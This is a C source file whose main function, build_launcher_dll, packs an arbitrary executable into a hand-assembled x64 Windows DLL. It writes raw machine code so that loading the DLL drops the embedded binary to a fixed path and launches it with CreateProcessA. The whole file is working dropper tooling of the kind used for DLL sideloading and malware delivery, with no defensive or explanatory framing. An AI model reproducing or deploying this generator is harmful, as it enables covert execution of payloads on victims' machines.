#include "config.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif
#define sock_close(fd) closesocket((SOCKET)(fd))

struct launcher_buf {
    unsigned char *data;
    size_t length;
    size_t capacity;
};
static int launcher_reserve(struct launcher_buf *buf, size_t extra)
{
    size_t needed;
    size_t capacity;
    unsigned char *data;
    needed = buf->length + extra;
    if (needed < buf->length)
        return -1;
    if (needed <= buf->capacity)
        return 0;
    capacity = buf->capacity ? buf->capacity : 256;
    while (capacity < needed) {
        size_t next = capacity * 2;
        if (next < capacity) {
            capacity = needed;
            break;
        }
        capacity = next;
    }
    data = realloc(buf->data, capacity);
    if (data == NULL)
        return -1;
    buf->data = data;
    buf->capacity = capacity;
    return 0;
}
static int launcher_append(struct launcher_buf *buf, const void *data, size_t length)
{
    if (launcher_reserve(buf, length) < 0)
        return -1;
    if (length != 0)
        memcpy(buf->data + buf->length, data, length);
    buf->length += length;
    return 0;
}
static int launcher_append_zero(struct launcher_buf *buf, size_t length)
{
    if (launcher_reserve(buf, length) < 0)
        return -1;
    memset(buf->data + buf->length, 0, length);
    buf->length += length;
    return 0;
}
static int launcher_append_u16(struct launcher_buf *buf, uint16_t value)
{
    unsigned char bytes[2];
    bytes[0] = (unsigned char)value;
    bytes[1] = (unsigned char)(value >> 8);
    return launcher_append(buf, bytes, sizeof(bytes));
}
static int launcher_append_u32(struct launcher_buf *buf, uint32_t value)
{
    unsigned char bytes[4];
    bytes[0] = (unsigned char)value;
    bytes[1] = (unsigned char)(value >> 8);
    bytes[2] = (unsigned char)(value >> 16);
    bytes[3] = (unsigned char)(value >> 24);
    return launcher_append(buf, bytes, sizeof(bytes));
}
static int launcher_append_u64(struct launcher_buf *buf, uint64_t value)
{
    unsigned char bytes[8];
    unsigned int i;
    for (i = 0; i < 8; ++i)
        bytes[i] = (unsigned char)(value >> (i * 8));
    return launcher_append(buf, bytes, sizeof(bytes));
}
static void launcher_put_u16(unsigned char *dst, uint16_t value)
{
    dst[0] = (unsigned char)value;
    dst[1] = (unsigned char)(value >> 8);
}
static void launcher_put_u32(unsigned char *dst, uint32_t value)
{
    dst[0] = (unsigned char)value;
    dst[1] = (unsigned char)(value >> 8);
    dst[2] = (unsigned char)(value >> 16);
    dst[3] = (unsigned char)(value >> 24);
}
static void launcher_put_u64(unsigned char *dst, uint64_t value)
{
    unsigned int i;
    for (i = 0; i < 8; ++i)
        dst[i] = (unsigned char)(value >> (i * 8));
}
static uint32_t launcher_align_u32(uint32_t value, uint32_t alignment)
{
    return (value + alignment - 1U) & ~(alignment - 1U);
}
static int launcher_emit(struct launcher_buf *buf, const void *bytes, size_t length)
{
    return launcher_append(buf, bytes, length);
}
static int launcher_emit_u32(struct launcher_buf *buf, uint32_t value)
{
    return launcher_append_u32(buf, value);
}
static int launcher_emit_rip_instruction(struct launcher_buf *code,
                                          const unsigned char *opcode,
                                          size_t opcode_length,
                                          uint32_t text_rva,
                                          uint32_t target_rva)
{
    uint32_t next_rva;
    int64_t displacement;
    if (launcher_append(code, opcode, opcode_length) < 0 ||
        launcher_append_zero(code, 4) < 0)
        return -1;
    next_rva = text_rva + (uint32_t)code->length;
    displacement = (int64_t)target_rva - (int64_t)next_rva;
    launcher_put_u32(code->data + code->length - 4, (uint32_t)(int32_t)displacement);
    return 0;
}
static int launcher_add_import_name(struct launcher_buf *rdata,
                                    const char *name,
                                    uint32_t *rva_offset)
{
    size_t length = strlen(name) + 1;
    if (rdata->length > UINT32_MAX)
        return -1;
    *rva_offset = (uint32_t)rdata->length;
    if (launcher_append_u16(rdata, 0) < 0 ||
        launcher_append(rdata, name, length) < 0)
        return -1;
    return 0;
}
static int launcher_write_all(int fd, const unsigned char *data, size_t length)
{
    size_t offset = 0;
    while (offset < length) {
        ssize_t written = write(fd, data + offset, length - offset);
        if (written < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (written == 0)
            return -1;
        offset += (size_t)written;
    }
    return 0;
}
int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    static const char *const import_names[] = {
        "CreateFileA",
        "WriteFile",
        "CloseHandle",
        "CreateProcessA"
    };
    static const unsigned char lea_rcx_opcode[] = { 0x48, 0x8d, 0x0d };
    static const unsigned char lea_rdx_opcode[] = { 0x48, 0x8d, 0x15 };
    static const unsigned char call_rax_iat_opcode[] = { 0xff, 0x15 };
    struct launcher_buf rdata = { 0 };
    struct launcher_buf code = { 0 };
    struct launcher_buf pe = { 0 };
    struct stat st;
    unsigned char *payload = NULL;
    uint32_t name_offsets[4];
    uint32_t path_offset;
    uint32_t relocation_offset;
    uint32_t import_rva;
    uint32_t text_rva = 0x1000;
    uint32_t rdata_rva;
    uint32_t data_rva;
    uint32_t text_raw_size;
    uint32_t rdata_raw_size;
    uint32_t data_raw_size;
    uint32_t text_raw_offset;
    uint32_t rdata_raw_offset;
    uint32_t data_raw_offset;
    uint32_t headers_size;
    uint32_t image_size;
    uint64_t payload_length;
    uint64_t image_end;
    uint32_t section_raw_end;
    size_t code_entry_branch;
    size_t file_length;
    size_t i;
    int input_fd = -1;
    int output_fd = -1;
    int result = -1;
    if (binary_path == NULL || dll_out_path == NULL)
        return -1;
    input_fd = open(binary_path, O_RDONLY);
    if (input_fd < 0)
        goto cleanup;
    if (fstat(input_fd, &st) < 0 || st.st_size < 0)
        goto cleanup;
    payload_length = (uint64_t)st.st_size;
    if (payload_length > UINT32_MAX)
        goto cleanup;
    if (payload_length != 0) {
        payload = malloc((size_t)payload_length);
        if (payload == NULL)
            goto cleanup;
    }
    {
        size_t offset = 0;
        while (offset < (size_t)payload_length) {
            ssize_t count = read(input_fd, payload + offset,
                                 (size_t)payload_length - offset);
            if (count < 0) {
                if (errno == EINTR)
                    continue;
                goto cleanup;
            }
            if (count == 0)
                goto cleanup;
            offset += (size_t)count;
        }
    }
    if (close(input_fd) < 0) {
        input_fd = -1;
        goto cleanup;
    }
    input_fd = -1;
    if (launcher_append_zero(&rdata, 120) < 0)
        goto cleanup;
    if (launcher_append(&rdata, "kernel32.dll", sizeof("kernel32.dll")) < 0)
        goto cleanup;
    for (i = 0; i < 4; ++i) {
        if (launcher_add_import_name(&rdata, import_names[i], &name_offsets[i]) < 0)
            goto cleanup;
    }
    if (rdata.length > UINT32_MAX)
        goto cleanup;
    path_offset = (uint32_t)rdata.length;
    if (launcher_append(&rdata, DROP_PATH, sizeof(DROP_PATH)) < 0)
        goto cleanup;
    if (launcher_append_zero(&rdata, 8 - (rdata.length & 7U)) < 0)
        goto cleanup;
    if (rdata.length > UINT32_MAX)
        goto cleanup;
    relocation_offset = (uint32_t)rdata.length;
    if (launcher_append_u32(&rdata, 0) < 0 ||
        launcher_append_u32(&rdata, 8) < 0 ||
        launcher_append_u16(&rdata, 0) < 0)
        goto cleanup;
    rdata_rva = launcher_align_u32(text_rva + 0x1000U, 0x1000U);
    launcher_put_u32(rdata.data + 0, rdata_rva + 40U);
    launcher_put_u32(rdata.data + 12, rdata_rva + 120U);
    launcher_put_u32(rdata.data + 16, rdata_rva + 80U);
    for (i = 0; i < 4; ++i) {
        uint64_t name_rva = (uint64_t)rdata_rva + name_offsets[i];
        launcher_put_u64(rdata.data + 40 + i * 8, name_rva);
        launcher_put_u64(rdata.data + 80 + i * 8, name_rva);
    }
    import_rva = rdata_rva;
    data_rva = launcher_align_u32(rdata_rva + (uint32_t)rdata.length, 0x1000U);
    {
        static const unsigned char prologue[] = {
            0x57,                          
            0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,  
            0x83, 0xfa, 0x01               
        };
        static const unsigned char branch_opcode[] = { 0x0f, 0x85 };
        if (launcher_emit(&code, prologue, sizeof(prologue)) < 0)
            goto cleanup;
        code_entry_branch = code.length;
        if (launcher_append(&code, branch_opcode, sizeof(branch_opcode)) < 0 ||
            launcher_append_zero(&code, 4) < 0)
            goto cleanup;
        {
            static const unsigned char bytes[] = {
                0x48, 0x8d, 0x7c, 0x24, 0x60,
                0x31, 0xc0,
                0xb9, 0x12, 0x00, 0x00, 0x00,
                0xf3, 0x48, 0xab,
                0xc7, 0x44, 0x24, 0x60, 0x68, 0x00, 0x00, 0x00
            };
            if (launcher_emit(&code, bytes, sizeof(bytes)) < 0)
                goto cleanup;
        }
        {
            uint32_t path_rva = rdata_rva + path_offset;
            uint32_t iat_create = rdata_rva + 80U;
            uint32_t iat_write = rdata_rva + 88U;
            uint32_t iat_close = rdata_rva + 96U;
            uint32_t iat_process = rdata_rva + 104U;
            unsigned char bytes[32];
            if (launcher_emit_rip_instruction(&code, lea_rcx_opcode,
                                              sizeof(lea_rcx_opcode),
                                              text_rva, path_rva) < 0)
                goto cleanup;
            {
                static const unsigned char create_args[] = {
                    0xba, 0x00, 0x00, 0x00, 0x40,
                    0x45, 0x31, 0xc0,
                    0x45, 0x31, 0xc9,
                    0xc7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00,
                    0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,
                    0x48, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00
                };
                if (launcher_emit(&code, create_args, sizeof(create_args)) < 0)
                    goto cleanup;
            }
            if (launcher_emit_rip_instruction(&code, call_rax_iat_opcode,
                                              sizeof(call_rax_iat_opcode),
                                              text_rva, iat_create) < 0)
                goto cleanup;
            {
                static const unsigned char store_handle[] = {
                    0x48, 0x89, 0x84, 0x24, 0xe0, 0x00, 0x00, 0x00,
                    0x48, 0x8b, 0x8c, 0x24, 0xe0, 0x00, 0x00, 0x00
                };
                if (launcher_emit(&code, store_handle, sizeof(store_handle)) < 0)
                    goto cleanup;
            }
            if (launcher_emit_rip_instruction(&code, lea_rdx_opcode,
                                              sizeof(lea_rdx_opcode),
                                              text_rva, data_rva) < 0)
                goto cleanup;
            bytes[0] = 0x41;
            bytes[1] = 0xb8;
            launcher_put_u32(bytes + 2, (uint32_t)payload_length);
            if (launcher_emit(&code, bytes, 6) < 0)
                goto cleanup;
            {
                static const unsigned char write_args[] = {
                    0x4c, 0x8d, 0x8c, 0x24, 0xe8, 0x00, 0x00, 0x00,
                    0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00
                };
                if (launcher_emit(&code, write_args, sizeof(write_args)) < 0)
                    goto cleanup;
            }
            if (launcher_emit_rip_instruction(&code, call_rax_iat_opcode,
                                              sizeof(call_rax_iat_opcode),
                                              text_rva, iat_write) < 0)
                goto cleanup;
            {
                static const unsigned char close_args[] = {
                    0x48, 0x8b, 0x8c, 0x24, 0xe0, 0x00, 0x00, 0x00
                };
                if (launcher_emit(&code, close_args, sizeof(close_args)) < 0)
                    goto cleanup;
            }
            if (launcher_emit_rip_instruction(&code, call_rax_iat_opcode,
                                              sizeof(call_rax_iat_opcode),
                                              text_rva, iat_close) < 0)
                goto cleanup;
            if (launcher_emit_rip_instruction(&code, lea_rcx_opcode,
                                              sizeof(lea_rcx_opcode),
                                              text_rva, path_rva) < 0)
                goto cleanup;
            {
                static const unsigned char process_args[] = {
                    0x31, 0xd2,
                    0x45, 0x31, 0xc0,
                    0x45, 0x31, 0xc9,
                    0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
                    0x48, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
                    0x48, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
                    0x48, 0xc7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,
                    0x48, 0x8d, 0x44, 0x24, 0x60,
                    0x48, 0x89, 0x44, 0x24, 0x40,
                    0x48, 0x8d, 0x84, 0x24, 0xc8, 0x00, 0x00, 0x00,
                    0x48, 0x89, 0x44, 0x24, 0x48
                };
                if (launcher_emit(&code, process_args, sizeof(process_args)) < 0)
                    goto cleanup;
            }
            if (launcher_emit_rip_instruction(&code, call_rax_iat_opcode,
                                              sizeof(call_rax_iat_opcode),
                                              text_rva, iat_process) < 0)
                goto cleanup;
            {
                static const unsigned char epilogue[] = {
                    0xb8, 0x01, 0x00, 0x00, 0x00,
                    0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00,
                    0x5f,
                    0xc3
                };
                size_t epilogue_offset = code.length;
                int64_t branch_displacement;
                if (launcher_emit(&code, epilogue, sizeof(epilogue)) < 0)
                    goto cleanup;
                branch_displacement =
                    (int64_t)(text_rva + epilogue_offset) -
                    (int64_t)(text_rva + code_entry_branch + 6);
                launcher_put_u32(code.data + code_entry_branch + 2,
                                 (uint32_t)(int32_t)branch_displacement);
            }
        }
    }
    if (code.length == 0 || code.length > UINT32_MAX ||
        rdata.length > UINT32_MAX)
        goto cleanup;
    data_rva = launcher_align_u32(rdata_rva + (uint32_t)rdata.length, 0x1000U);
    if (data_rva < rdata_rva)
        goto cleanup;
    {
        size_t offset = 0;
        size_t seen = 0;
        while (offset + 7 <= code.length) {
            if (code.data[offset] == 0x48 && code.data[offset + 1] == 0x8d &&
                code.data[offset + 2] == 0x15) {
                ++seen;
                if (seen == 1) {
                    uint32_t next_rva = text_rva + (uint32_t)offset + 7U;
                    int64_t displacement = (int64_t)data_rva - next_rva;
                    launcher_put_u32(code.data + offset + 3,
                                     (uint32_t)(int32_t)displacement);
                    break;
                }
            }
            ++offset;
        }
        if (seen == 0)
            goto cleanup;
    }
    text_raw_size = launcher_align_u32((uint32_t)code.length, 0x200U);
    rdata_raw_size = launcher_align_u32((uint32_t)rdata.length, 0x200U);
    data_raw_size = payload_length == 0
                        ? 0
                        : launcher_align_u32((uint32_t)payload_length, 0x200U);
    headers_size = 0x200U;
    text_raw_offset = headers_size;
    rdata_raw_offset = text_raw_offset + text_raw_size;
    data_raw_offset = rdata_raw_offset + rdata_raw_size;
    section_raw_end = data_raw_offset + data_raw_size;
    image_end = (uint64_t)data_rva + payload_length;
    if (image_end > UINT32_MAX)
        goto cleanup;
    image_size = launcher_align_u32((uint32_t)image_end, 0x1000U);
    if (image_size < image_end)
        goto cleanup;
    if (launcher_append_zero(&pe, section_raw_end) < 0)
        goto cleanup;
    {
        unsigned char *base = pe.data;
        size_t pe_offset = 0x80;
        size_t coff_offset = pe_offset + 4;
        size_t optional_offset = coff_offset + 20;
        size_t section_offset = optional_offset + 240;
        uint32_t initialized_size = rdata_raw_size + data_raw_size;
        base[0] = 'M';
        base[1] = 'Z';
        launcher_put_u32(base + 0x3c, (uint32_t)pe_offset);
        memcpy(base + pe_offset, "PE\0\0", 4);
        launcher_put_u16(base + coff_offset, 0x8664);
        launcher_put_u16(base + coff_offset + 2, 3);
        launcher_put_u32(base + coff_offset + 4, 0);
        launcher_put_u32(base + coff_offset + 8, 0);
        launcher_put_u32(base + coff_offset + 12, 0);
        launcher_put_u16(base + coff_offset + 16, 240);
        launcher_put_u16(base + coff_offset + 18, 0x2022);
        launcher_put_u16(base + optional_offset, 0x20b);
        base[optional_offset + 2] = 1;
        base[optional_offset + 3] = 0;
        launcher_put_u32(base + optional_offset + 4, text_raw_size);
        launcher_put_u32(base + optional_offset + 8, initialized_size);
        launcher_put_u32(base + optional_offset + 12, 0);
        launcher_put_u32(base + optional_offset + 16, text_rva);
        launcher_put_u32(base + optional_offset + 20, text_rva);
        launcher_put_u64(base + optional_offset + 24, UINT64_C(0x180000000));
        launcher_put_u32(base + optional_offset + 32, 0x1000);
        launcher_put_u32(base + optional_offset + 36, 0x200);
        launcher_put_u16(base + optional_offset + 40, 6);
        launcher_put_u16(base + optional_offset + 42, 0);
        launcher_put_u16(base + optional_offset + 44, 0);
        launcher_put_u16(base + optional_offset + 46, 0);
        launcher_put_u16(base + optional_offset + 48, 6);
        launcher_put_u16(base + optional_offset + 50, 0);
        launcher_put_u32(base + optional_offset + 52, 0);
        launcher_put_u32(base + optional_offset + 56, image_size);
        launcher_put_u32(base + optional_offset + 60, headers_size);
        launcher_put_u32(base + optional_offset + 64, 0);
        launcher_put_u16(base + optional_offset + 68, 3);
        launcher_put_u16(base + optional_offset + 70, 0x40);
        launcher_put_u64(base + optional_offset + 72, UINT64_C(0x100000));
        launcher_put_u64(base + optional_offset + 80, UINT64_C(0x1000));
        launcher_put_u64(base + optional_offset + 88, UINT64_C(0x100000));
        launcher_put_u64(base + optional_offset + 96, UINT64_C(0x1000));
        launcher_put_u32(base + optional_offset + 104, 0);
        launcher_put_u32(base + optional_offset + 108, 16);
        launcher_put_u32(base + optional_offset + 112 + 8, import_rva);
        launcher_put_u32(base + optional_offset + 112 + 12, 40);
        launcher_put_u32(base + optional_offset + 112 + 40,
                         rdata_rva + relocation_offset);
        launcher_put_u32(base + optional_offset + 112 + 44, 8);
        memcpy(base + text_raw_offset, code.data, code.length);
        memcpy(base + rdata_raw_offset, rdata.data, rdata.length);
        if (payload_length != 0)
            memcpy(base + data_raw_offset, payload, (size_t)payload_length);
        memcpy(base + section_offset, ".text", 5);
        launcher_put_u32(base + section_offset + 8, (uint32_t)code.length);
        launcher_put_u32(base + section_offset + 12, text_rva);
        launcher_put_u32(base + section_offset + 16, text_raw_size);
        launcher_put_u32(base + section_offset + 20, text_raw_offset);
        launcher_put_u32(base + section_offset + 36, 0x60000020);
        section_offset += 40;
        memcpy(base + section_offset, ".rdata", 6);
        launcher_put_u32(base + section_offset + 8, (uint32_t)rdata.length);
        launcher_put_u32(base + section_offset + 12, rdata_rva);
        launcher_put_u32(base + section_offset + 16, rdata_raw_size);
        launcher_put_u32(base + section_offset + 20, rdata_raw_offset);
        launcher_put_u32(base + section_offset + 36, 0x40000040);
        section_offset += 40;
        memcpy(base + section_offset, ".data", 5);
        launcher_put_u32(base + section_offset + 8, (uint32_t)payload_length);
        launcher_put_u32(base + section_offset + 12, data_rva);
        launcher_put_u32(base + section_offset + 16, data_raw_size);
        launcher_put_u32(base + section_offset + 20, data_raw_offset);
        launcher_put_u32(base + section_offset + 36, 0xc0000040);
    }
    output_fd = open(dll_out_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (output_fd < 0)
        goto cleanup;
    file_length = pe.length;
    if (launcher_write_all(output_fd, pe.data, file_length) < 0)
        goto cleanup;
    if (close(output_fd) < 0) {
        output_fd = -1;
        goto cleanup;
    }
    output_fd = -1;
    result = 0;
cleanup:
    if (input_fd >= 0)
        close(input_fd);
    if (output_fd >= 0)
        close(output_fd);
    if (result < 0 && dll_out_path != NULL)
        unlink(dll_out_path);
    free(payload);
    free(rdata.data);
    free(code.data);
    free(pe.data);
    return result;
}
